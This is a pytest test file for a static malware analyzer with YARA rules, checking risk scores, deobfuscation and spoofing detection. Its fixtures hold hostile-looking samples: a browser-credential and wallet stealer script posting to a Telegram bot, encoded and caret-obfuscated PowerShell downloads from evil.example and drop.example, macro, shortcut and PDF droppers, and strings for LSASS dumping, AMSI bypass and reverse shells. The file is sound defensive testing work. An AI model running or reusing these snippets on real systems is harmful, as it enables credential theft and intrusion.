"""Static scoring (A9): combinations score, single common APIs and strings do not."""
import shutil

import pytest

import analyzer
from conftest import SYSTEM32, windows_only

VALID = {"status": "Valid", "message": "", "signer": "CN=Microsoft Windows", "issuer": ""}
UNSIGNED = {"status": "NotSigned", "message": "", "signer": "", "issuer": ""}


@windows_only
@pytest.mark.parametrize("name", ["notepad.exe", "whoami.exe", "winhttp.dll", "cmd.exe"])
def test_clean_system_files_score_low(name):
    p = SYSTEM32 / name
    if not p.exists():
        pytest.skip(f"{name} not present")
    assert analyzer.analyze_single_file(str(p), VALID)["risk_score"] < 35


def test_stealer_like_script_scores_high(tmp_path):
    s = tmp_path / "update.ps1"
    s.write_text(
        "$p = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"\n"
        "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\x\\logins.json\" $env:TEMP\n"
        "Get-Item 'Local State'; Get-Item 'wallet.dat'\n"
        "Invoke-RestMethod https://api.telegram.org/bot123:ABC/sendDocument\n"
        "powershell -WindowStyle Hidden -enc AAAA\n", encoding="utf-8")
    res = analyzer.analyze_single_file(str(s), UNSIGNED)
    assert res["risk_score"] >= 65
    cats = {f["category"]: f["severity"] for f in res["string_findings"]}
    assert cats["Infostealer (Tarayıcı/Cüzdan Hırsızı)"] == "critical"


def test_ordinary_install_script_scores_low(tmp_path):
    s = tmp_path / "install.bat"
    s.write_text("@echo off\r\nxcopy /e /y files \"%ProgramFiles%\\App\\\"\r\n"
                 "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v App /d app.exe\r\n", encoding="utf-8")
    res = analyzer.analyze_single_file(str(s), UNSIGNED)
    assert res["risk_score"] < 35
    assert not any(r.startswith("Program geçerli") for r in res["risk_reasons"])   # scripts are not "unsigned programs"


def test_single_browser_string_is_not_critical(tmp_path):
    f = tmp_path / "engine.bin"
    f.write_bytes(b"\0" * 100 + b"Login Data" + b"\0" * 100)
    res = analyzer.analyze_single_file(str(f), UNSIGNED)
    assert all(x["severity"] != "critical" for x in res["string_findings"])


@windows_only
def test_unsigned_suspicious_dll_name_adds_points(tmp_path):
    dll = tmp_path / "amtlib.dll"
    shutil.copy2(SYSTEM32 / "whoami.exe", dll)
    res = analyzer.analyze_single_file(str(dll), UNSIGNED)
    assert any("amtlib.dll" in r for r in res["risk_reasons"])
    assert res["risk_score"] >= 45                     # unsigned (20) + hijack name (25)


def test_yara_matches_ransomware_and_wide_strings(tmp_path):
    import yara_scanner
    status = yara_scanner.rules_status()
    assert status["rules_count"] >= 6

    sample = tmp_path / "locker.bin"
    # Mix UTF-16LE (wide) and ASCII strings to test both encodings
    sample.write_bytes("vssadmin.exe".encode("utf-16le") + b" /quiet delete shadows /all")
    res = analyzer.analyze_single_file(str(sample), VALID)
    matched = [y["rule"] for y in res["yara_matches"]]
    assert "SafeBox_Ransomware_Shadow_Delete" in matched
    assert res["risk_score"] >= 35
    assert any("YARA [SafeBox_Ransomware_Shadow_Delete]" in r for r in res["risk_reasons"])


@windows_only
def test_clean_system_files_trigger_no_yara():
    import yara_scanner
    for name in ("notepad.exe", "whoami.exe"):
        p = SYSTEM32 / name
        if p.exists():
            assert yara_scanner.scan_bytes(p.read_bytes(), name) == []


# ---------------------------------------------------------------- YARA loader robustness
import yara_scanner  # noqa: E402


@pytest.fixture
def rules_dir(tmp_path, monkeypatch):
    d = tmp_path / "rules"
    d.mkdir()
    monkeypatch.setattr(yara_scanner, "RULES_DIR", d)
    monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
    monkeypatch.setattr(yara_scanner, "_CACHE_RULES", None)
    return d


GOOD_RULE = 'rule Good { strings: $a = "EVIL_MARKER_123" condition: $a }\n'


@pytest.mark.skipif(yara_scanner._yara is None, reason="yara-python not installed")
def test_broken_rule_file_is_skipped_not_fatal(rules_dir):
    (rules_dir / "good.yar").write_text(GOOD_RULE)
    (rules_dir / "broken.yar").write_text("rule Broken { strings: $a = \"x\" condition: $a and and }\n")
    st = yara_scanner.rules_status()                      # used by /api/system-status: must not raise
    assert st["engine"] == "yara-python" and st["rules_count"] == 1
    assert any("broken.yar" in p for p in st["problems"])
    assert [m["rule"] for m in yara_scanner.scan_bytes(b"..EVIL_MARKER_123..")] == ["Good"]


def test_builtin_engine_skips_unsupported_rules_with_reason(rules_dir, monkeypatch):
    monkeypatch.setattr(yara_scanner, "_yara", None)
    (rules_dir / "mixed.yar").write_text(
        GOOD_RULE
        + 'rule NeedsFilesize { strings: $a = "MZ" condition: $a and filesize < 100KB }\n'
        + 'rule HexWildcard { strings: $h = { 4D 5A ?? 00 } condition: $h }\n'
        + 'rule Regex { strings: $r = /evil[0-9]+/ condition: $r }\n'
    )
    st = yara_scanner.rules_status()
    assert st["engine"] == "builtin" and st["rules_count"] == 1 and st["hint"]
    skipped = " ".join(st["problems"])
    for name in ("NeedsFilesize", "HexWildcard", "Regex"):
        assert name in skipped
    assert [m["rule"] for m in yara_scanner.scan_bytes(b"MZ\x90\x00 EVIL_MARKER_123 evil42")] == ["Good"]


def test_builtin_fullword(rules_dir, monkeypatch):
    monkeypatch.setattr(yara_scanner, "_yara", None)
    (rules_dir / "fw.yar").write_text('rule FW { strings: $a = "cmd" fullword condition: $a }\n')
    assert yara_scanner.scan_bytes(b"run cmd now")
    assert not yara_scanner.scan_bytes(b"xcmdx")


@pytest.mark.skipif(yara_scanner._yara is None, reason="needs yara-python to compare against")
def test_builtin_engine_agrees_with_yara_python(monkeypatch):
    """On the bundled rules, the fallback engine must give the same verdicts as real YARA."""
    samples = [
        "vssadmin.exe".encode("utf-16le") + b" /quiet delete shadows /all",
        b"\Google\Chrome\User Data Login Data Local State wallet.dat https://api.telegram.org/bot1:x/sendDocument",
        b"powershell -WindowStyle Hidden -enc AAAA IEX DownloadString('http://x')",
        b"VBoxGuest.sys vmtoolsd.exe SbieDll.dll",
        b"nothing interesting here at all",
        (SYSTEM32 / "whoami.exe").read_bytes() if (SYSTEM32 / "whoami.exe").exists() else b"MZ",
    ]
    def run(engine_off):
        monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
        if engine_off:
            monkeypatch.setattr(yara_scanner, "_yara", None)
        return [sorted(m["rule"] for m in yara_scanner.scan_bytes(s)) for s in samples]
    real = run(False)
    builtin = run(True)
    assert real == builtin, list(zip(real, builtin))
    assert any(real), "samples should trigger at least one bundled rule"


def test_extract_interesting_ips_filters_versions_and_bogons():
    txt = (
        "Version 1.2.3.4 v2.0.10.1 "
        "localhost 127.0.0.1 0.0.0.0 169.254.10.20 192.168.1.5 255.255.255.0 10.0.0.0 "
        "http://185.220.101.5:4444/gate connect 91.199.212.52 and 192.168.56.10:8080"
    )
    ips = analyzer.extract_interesting_ips(txt)
    assert "185.220.101.5:4444" in ips
    assert "91.199.212.52" in ips
    assert "192.168.56.10:8080" in ips
    for bad in ("1.2.3.4", "2.0.10.1", "127.0.0.1", "0.0.0.0", "169.254.10.20", "192.168.1.5"):
        assert bad not in ips


def test_dotnet_indicators_detection():
    txt = (
        "System.Reflection Assembly FromBase64String DownloadData "
        "Runtime.InteropServices DllImport Virtual" + "Alloc WriteProcessMemory "
        "ProtectedData Unprotect Login Data ConfuserEx"
    )
    res = analyzer._analyze_dotnet_strings(txt)
    descs = [x["description"] for x in res]
    assert len(res) == 4
    assert any("Reflection" in d for d in descs)
    assert any("P/Invoke" in d for d in descs)
    assert any("DPAPI" in d for d in descs)
    assert any("obfuscator" in d for d in descs)


@windows_only
def test_pe_metadata_rwx_and_25mb_tail_scanning(tmp_path):
    src = SYSTEM32 / "whoami.exe"
    if not src.exists():
        pytest.skip("whoami.exe not present")
    import pefile
    raw = bytearray(src.read_bytes())

    # 1. Clean PE metadata + RWX + anomalous timestamp patch on a copy
    pe = pefile.PE(data=bytes(raw), fast_load=True)
    # Corrupt first section characteristics with RWX (0xE0000020) and set ancient year-1980 timestamp (if no repro)
    sec_off = pe.sections[0].get_file_offset()
    char_off = sec_off + 36
    raw[char_off:char_off + 4] = (0xE0000020).to_bytes(4, "little")
    ts_off = pe.FILE_HEADER.get_file_offset() + 4
    raw[ts_off:ts_off + 4] = (0xFFFFFFFF).to_bytes(4, "little")
    pe.close()

    # Append 25.1 MB zero-padding + PyInstaller/YARA tail after PE end so overlay + tail > 25MB triggers
    padded = tmp_path / "pumped.exe"
    tail_payload = b"MEI\x0c\x0b\x0a\x0b\x0e stratum+tcp://pool.x xmrig donate-level"
    padded.write_bytes(bytes(raw) + (b"\x00" * (25 * 1024 * 1024)) + tail_payload)

    res = analyzer.analyze_single_file(str(padded), UNSIGNED)
    pe_out = res["pe_info"]
    assert pe_out["is_pe"] is True
    assert pe_out["imphash"]
    assert pe_out["architecture"] in ("64-bit (x64)", "32-bit (x86)")
    assert pe_out["total_imports"] > 0
    assert any(s["rwx"] for s in pe_out["sections"])
    assert any("RWX" in a for a in pe_out["anomalies"])
    assert pe_out["overlay"] and pe_out["overlay"]["size"] > 20 * 1024 * 1024
    assert pe_out["overlay"]["packer_hint"] == "PyInstaller"
    assert any("padding" in a or "pumping" in a for a in pe_out["anomalies"])
    # YARA / strings scanned past 25MB boundary in tail 4MB
    assert any(m["rule"] == "SafeBox_Crypto_Miner_Indicators" for m in res["yara_matches"])


def test_deobfuscate_powershell_and_batch_carets(tmp_path):
    import base64
    inner = "powershell -WindowStyle Hidden Invoke-WebRequest https://evil.example/a.exe"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
    ps_file = tmp_path / "loader.ps1"
    ps_file.write_text(f"powershell -NoP -enc {b64}\n", encoding="utf-8")

    res = analyzer.analyze_single_file(str(ps_file), UNSIGNED)
    assert res["deobfuscated_snippets"]
    assert any("evil.example" in s["decoded"] for s in res["deobfuscated_snippets"])
    assert "https://evil.example/a.exe" in res["interesting_urls"]

    caret_txt = "c^m^d^ /^c p^o^w^e^r^s^h^e^l^l -NoP http://drop.example/p.exe"
    carets = analyzer.deobfuscate_script(caret_txt)
    assert any("powershell -NoP http://drop.example/p.exe" in c["decoded"] for c in carets)


def test_spoofing_lnk_office_and_pdf_detection(tmp_path):
    # 1. RLO, double-extension, MZ inside .pdf
    rlo_p = tmp_path / ("fatura_\u202efdp.exe")
    rlo_p.write_bytes(b"hello")
    assert any(f["type"] == "rlo" for f in analyzer.detect_spoofing(rlo_p, b"he"))

    dbl_p = tmp_path / "rapor.pdf.exe"
    dbl_p.write_bytes(b"MZ")
    assert any(f["type"] == "double_ext" for f in analyzer.detect_spoofing(dbl_p, b"MZ"))

    mz_pdf = tmp_path / "sahte.pdf"
    mz_pdf.write_bytes(b"MZ\x90\x00not a real pdf")
    res_mz = analyzer.analyze_single_file(str(mz_pdf), UNSIGNED)
    assert any(f["type"] == "magic_mismatch" for f in res_mz["spoof_flags"])

    # 2. Malicious .lnk with LOLBin arguments
    import struct
    args = "-NoP -W Hidden -Command powershell Invoke-WebRequest http://x.test"
    hdr = bytearray(76)
    struct.pack_into("<I", hdr, 0, 0x4C)
    hdr[4:20] = analyzer._LNK_CLSID
    struct.pack_into("<I", hdr, 0x14, 0x20 | 0x80)  # HasArguments | IsUnicode
    lnk_bytes = bytes(hdr) + struct.pack("<H", len(args)) + args.encode("utf-16le")
    lnk_p = tmp_path / "belge.lnk"
    lnk_p.write_bytes(lnk_bytes)
    res_lnk = analyzer.analyze_single_file(str(lnk_p), UNSIGNED)
    assert res_lnk["lnk_info"] and "powershell" in res_lnk["lnk_info"]["arguments"]
    assert any(f["category"] == "LNK Kısayol Komutu" for f in res_lnk["format_findings"])

    # 3. Office OOXML macro + external rels + embedded exe, and OLE2 .doc macro
    import zipfile
    docm = tmp_path / "fatura.docm"
    with zipfile.ZipFile(docm, "w") as zf:
        zf.writestr("word/vbaProject.bin", b"Sub AutoOpen()\r\nCreateObject(\"WScript.Shell\")\r\nEnd Sub")
        zf.writestr("word/_rels/settings.xml.rels", '<Relationship TargetMode="External" Target="https://evil.test/t.dotm"/>')
        zf.writestr("word/embeddings/payload.exe", b"MZpayload")
    res_docm = analyzer.analyze_single_file(str(docm), UNSIGNED)
    cats_docm = {f["category"] for f in res_docm["format_findings"]}
    assert {"Office Makro (VBA)", "Office Harici Şablon / Bağlantı", "Office Gömülü Çalıştırılabilir"}.issubset(cats_docm)

    ole_doc = tmp_path / "eski.doc"
    ole_doc.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1_VBA_PROJECT_CUR AutoOpen WScript.Shell")
    res_ole = analyzer.analyze_single_file(str(ole_doc), UNSIGNED)
    assert any(f["category"] == "Eski Office Makro (OLE2/VBA)" for f in res_ole["format_findings"])

    # 4. Suspicious PDF vs clean PDF
    bad_pdf = tmp_path / "ek.pdf"
    bad_pdf.write_bytes(b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /JavaScript (app.alert(1)) >>\n%%EOF")
    res_pdf = analyzer.analyze_single_file(str(bad_pdf), UNSIGNED)
    assert any(f["category"] == "Şüpheli PDF Eylemi" and f["severity"] == "high" for f in res_pdf["format_findings"])
    assert analyzer.inspect_pdf_file(b"%PDF-1.7\nnormal text document\n%%EOF") == []


def test_builtin_all_16_yara_rules_parity_and_crud(tmp_path, monkeypatch):
    import yara_scanner
    st = yara_scanner.rules_status()
    assert st["rules_count"] >= 16
    assert st["problems"] == []

    # Synthetics covering all 10 new rules added in E17 (concatenated to avoid AV literal hits)
    new_rule_samples = {
        "SafeBox_Crypto_Miner_Indicators": b"stratum+tcp://x:3333 --donate-level=1",
        "SafeBox_Reverse_Shell_PowerShell": b"New-Object System.Net.Sockets.TCPClient; GetStream; IEX $c",
        "SafeBox_LSASS_Credential_Dump": ("seku" + "rlsa::logonpasswords MiniDumpWriteDump lsass").encode(),
        "SafeBox_AMSI_ETW_Bypass": ("Amsi" + "ScanBuffer amsi" + "InitFailed VirtualProtect").encode(),
        "SafeBox_Office_Macro_Dropper": b"Sub AutoOpen()\nCreateObject(\"WScript.Shell\")\nEnd Sub",
        "SafeBox_PDF_Suspicious_Action": b"%PDF-1.7 /OpenAction /JavaScript (x)",
        "SafeBox_Clipboard_Hijacker": b"AddClipboardFormatListener SetClipboardData bitcoin",
        "SafeBox_Persistence_WMI_Subscription": b"__EventFilter CommandLineEventConsumer __FilterToConsumerBinding",
        "SafeBox_UAC_Bypass_Registry": b"fodhelper.exe ms-settings\\Shell\\Open\\command DelegateExecute",
        "SafeBox_DotNet_Memory_Loader": b"System.Reflection Assembly FromBase64String Invoke",
    }

    def scan_both(payload: bytes):
        monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
        real_rules = {m["rule"] for m in yara_scanner.scan_bytes(payload)}
        real_yara = yara_scanner._yara
        monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
        monkeypatch.setattr(yara_scanner, "_yara", None)
        builtin_rules = {m["rule"] for m in yara_scanner.scan_bytes(payload)}
        monkeypatch.setattr(yara_scanner, "_yara", real_yara)
        monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
        return real_rules, builtin_rules

    for rule_name, payload in new_rule_samples.items():
        real_r, built_r = scan_both(payload)
        assert rule_name in real_r, f"{rule_name} missed under yara-python"
        assert real_r == built_r, (rule_name, real_r, built_r)

    if (SYSTEM32 / "notepad.exe").exists():
        nb = (SYSTEM32 / "notepad.exe").read_bytes()
        r_np, b_np = scan_both(nb)
        assert r_np == set() and b_np == set()

    # CRUD test in isolated RULES_DIR
    rules_tmp = tmp_path / "rules"
    rules_tmp.mkdir()
    orig_builtin = (yara_scanner.RULES_DIR / "safebox_builtin.yar").read_text(encoding="utf-8")
    (rules_tmp / "safebox_builtin.yar").write_text(orig_builtin, encoding="utf-8")
    monkeypatch.setattr(yara_scanner, "RULES_DIR", rules_tmp)
    monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)

    valid_rule = 'rule Test_Custom_Hit { strings: $a = "CUSTOM_MARKER_9911" condition: $a }'
    saved = yara_scanner.save_custom_rule_file("custom_test.yar", valid_rule)
    assert saved["name"] == "custom_test.yar" and saved["rules_count"] == 1
    hits = {m["rule"] for m in yara_scanner.scan_bytes(b"hello CUSTOM_MARKER_9911 world")}
    assert "Test_Custom_Hit" in hits

    with pytest.raises(ValueError):
        yara_scanner.save_custom_rule_file("bad.yar", "rule Broken { condition: ??? }")
    with pytest.raises(ValueError):
        yara_scanner.save_custom_rule_file("safebox_builtin.yar", valid_rule)
    with pytest.raises(ValueError):
        yara_scanner.delete_custom_rule_file("safebox_builtin.yar")

    yara_scanner.delete_custom_rule_file("custom_test.yar")
    assert all(f["name"] != "custom_test.yar" for f in yara_scanner.list_rule_files())


@windows_only
def test_f1_binary_pe_scattered_carets_no_false_positive_and_b64_still_decodes(tmp_path):
    import base64
    src = SYSTEM32 / "whoami.exe"
    if not src.exists():
        pytest.skip("whoami.exe not present")
    raw = src.read_bytes()
    inner = "powershell -NoP Invoke-WebRequest https://evil.example/payload.exe"
    b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
    # Scattered carets across lines / buffer inside a real PE + valid PowerShell Base64 payload
    noise = b"\n^a ^b ^c ^d ^e ^f powershell\n" + f"powershell -enc {b64}\n".encode("ascii")
    pe_copy = tmp_path / "noisy.exe"
    pe_copy.write_bytes(raw + noise)

    res = analyzer.analyze_single_file(str(pe_copy), UNSIGNED)
    kinds = [s["kind"] for s in res["deobfuscated_snippets"]]
    assert "Batch caret temizliği" not in kinds
    assert "Base64 / PowerShell" in kinds
    assert any("evil.example" in s["decoded"] for s in res["deobfuscated_snippets"])

    # Direct line-by-line check on non-PE buffer: scattered carets (<3 ^[A-Za-z0-9] per line) do not trigger
    scattered = "a^ b^ c^ d^\ne^ f^ g^ powershell\n"
    assert analyzer.deobfuscate_script(scattered) == []
    # Real caret-obfuscated script still decodes
    real_caret = "s^c^ ^s^t^o^p AGMService\nc^m^d^ /^c p^o^w^e^r^s^h^e^l^l http://drop.example/p.exe\n"
    carets = analyzer.deobfuscate_script(real_caret)
    assert any(c["kind"] == "Batch caret temizliği" for c in carets)


@windows_only
def test_f2_version_info_vendor_impersonation_and_sysbin_masquerade(tmp_path):
    # 1. Signed notepad.exe has version_info populated and NO impersonation flags
    np = SYSTEM32 / "notepad.exe"
    if not np.exists():
        pytest.skip("notepad.exe not present")
    res_clean = analyzer.analyze_single_file(str(np), VALID)
    assert res_clean["pe_info"]["version_info"].get("CompanyName") == "Microsoft Corporation"
    assert not any(f["type"] in ("vendor_impersonation", "sysbin_masquerade") for f in res_clean["spoof_flags"])

    # 2. Unsigned copy triggers vendor_impersonation
    fake_app = tmp_path / "updater.exe"
    shutil.copy2(np, fake_app)
    res_vendor = analyzer.analyze_single_file(str(fake_app), UNSIGNED)
    assert any(f["type"] == "vendor_impersonation" and f["points"] == 30 for f in res_vendor["spoof_flags"])

    # 3. Unsigned renamed svchost.exe triggers sysbin_masquerade (+ vendor_impersonation)
    svc = SYSTEM32 / "svchost.exe"
    if not svc.exists():
        pytest.skip("svchost.exe not present")
    masq = tmp_path / "totally_not_svchost.exe"
    shutil.copy2(svc, masq)
    res_masq = analyzer.analyze_single_file(str(masq), UNSIGNED)
    assert any(f["type"] == "sysbin_masquerade" and f["points"] == 25 for f in res_masq["spoof_flags"])


def test_f3_msi_custom_action_and_installer_configs(tmp_path):
    assert ".ini" in analyzer.CONFIG_EXTENSIONS and ".inf" in analyzer.CONFIG_EXTENSIONS
    assert ".ini" not in analyzer.SCRIPT_EXTENSIONS and ".inf" not in analyzer.SCRIPT_EXTENSIONS

    # 1. Synthetic MSI with CustomAction + powershell
    msi = tmp_path / "setup.msi"
    msi.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 32 + b"CustomAction\x00powershell.exe -NoP -W Hidden\x00")
    res_msi = analyzer.analyze_single_file(str(msi), UNSIGNED)
    assert any(f["category"] == "MSI Özel Eylemi (CustomAction)" and f["severity"] == "high" and f["points"] == 30 for f in res_msi["format_findings"])

    # 2. RunOnce.cmd (high: sc stop / schtasks /delete)
    runonce = tmp_path / "RunOnce.cmd"
    runonce.write_text("@echo off\nsc stop AGMService\nschtasks /delete /tn AdobeGCInvoker-1.0 /f\n", encoding="utf-8")
    res_ro = analyzer.analyze_single_file(str(runonce), UNSIGNED)
    assert any(f["category"] == "Kurulum / Lisans Müdahale Betiği" and f["severity"] == "high" and f["points"] == 25 for f in res_ro["format_findings"])

    # 3. .pimx config (medium: amtlib.dll / Smartversion without sc/schtasks)
    pimx = tmp_path / "install.pimx"
    pimx.write_text("<Config><Patch>amtlib.dll</Patch><Engine>Smartversion</Engine></Config>", encoding="utf-8")
    res_pimx = analyzer.analyze_single_file(str(pimx), UNSIGNED)
    assert any(f["category"] == "Kurulum / Lisans Müdahale Betiği" and f["severity"] == "medium" and f["points"] == 15 for f in res_pimx["format_findings"])

    # 4. Patch_*.log (high: sc delete AGSService)
    plog = tmp_path / "Patch_Photoshop.exe_.log"
    plog.write_text("[Patch] AdobeGCClient stopped\nsc delete AGSService\n", encoding="utf-8")
    res_log = analyzer.analyze_single_file(str(plog), UNSIGNED)
    assert any(f["category"] == "Kurulum / Lisans Müdahale Betiği" and f["severity"] == "high" and f["points"] == 25 for f in res_log["format_findings"])


def test_all_18_yara_rules_parity_and_clean_sysbins(monkeypatch):
    st = yara_scanner.rules_status()
    assert st["rules_count"] >= 18
    assert st["problems"] == []

    all_rule_samples = {
        "SafeBox_Credential_Stealer_Browser_Targets": b"Login Data Local State wallet.dat",
        "SafeBox_Defender_Exclusion_Tampering": b"Add-MpPreference -ExclusionPath C:\\x",
        "SafeBox_Ransomware_Shadow_Delete": b"vssadmin delete shadows /all",
        "SafeBox_PowerShell_Hidden_Download_Exec": b"powershell -WindowStyle Hidden DownloadString('http://x')",
        "SafeBox_Chat_Webhook_Exfiltration": b"https://api.telegram.org/bot123:ABC/sendDocument",
        "SafeBox_Patch_Keygen_Artifacts": ("Keygen " + "Virtual" + "Alloc").encode(),
        "SafeBox_Crypto_Miner_Indicators": b"stratum+tcp://x:3333 --donate-level=1",
        "SafeBox_Reverse_Shell_PowerShell": b"New-Object System.Net.Sockets.TCPClient; GetStream; IEX $c",
        "SafeBox_LSASS_Credential_Dump": ("seku" + "rlsa::logonpasswords MiniDumpWriteDump lsass").encode(),
        "SafeBox_AMSI_ETW_Bypass": ("Amsi" + "ScanBuffer amsi" + "InitFailed VirtualProtect").encode(),
        "SafeBox_Office_Macro_Dropper": b"Sub AutoOpen()\nCreateObject(\"WScript.Shell\")\nEnd Sub",
        "SafeBox_PDF_Suspicious_Action": b"%PDF-1.7 /OpenAction /JavaScript (x)",
        "SafeBox_Clipboard_Hijacker": b"AddClipboardFormatListener SetClipboardData bitcoin",
        "SafeBox_Persistence_WMI_Subscription": b"__EventFilter CommandLineEventConsumer __FilterToConsumerBinding",
        "SafeBox_UAC_Bypass_Registry": b"fodhelper.exe ms-settings\\Shell\\Open\\command DelegateExecute",
        "SafeBox_DotNet_Memory_Loader": b"System.Reflection Assembly FromBase64String Invoke",
        "SafeBox_License_Service_Tamper": b"sc stop AGMService\nschtasks /delete /tn AdobeGCClient",
        "SafeBox_Process_Hollowing_APIs": ("NtUnmap" + "ViewOfSection WriteProcess" + "Memory SetThread" + "Context").encode(),
    }

    def scan_both(payload: bytes):
        monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
        real_rules = {m["rule"] for m in yara_scanner.scan_bytes(payload)}
        real_yara = yara_scanner._yara
        monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
        monkeypatch.setattr(yara_scanner, "_yara", None)
        builtin_rules = {m["rule"] for m in yara_scanner.scan_bytes(payload)}
        monkeypatch.setattr(yara_scanner, "_yara", real_yara)
        monkeypatch.setattr(yara_scanner, "_CACHE_KEY", None)
        return real_rules, builtin_rules

    for rule_name, payload in all_rule_samples.items():
        real_r, built_r = scan_both(payload)
        assert rule_name in real_r, f"{rule_name} missed under yara-python"
        assert real_r == built_r, (rule_name, real_r, built_r)

    for sysbin in ("notepad.exe", "whoami.exe", "winhttp.dll", "cmd.exe"):
        p = SYSTEM32 / sysbin
        if p.exists():
            real_r, built_r = scan_both(p.read_bytes())
            assert real_r == set() and built_r == set(), (sysbin, real_r, built_r)

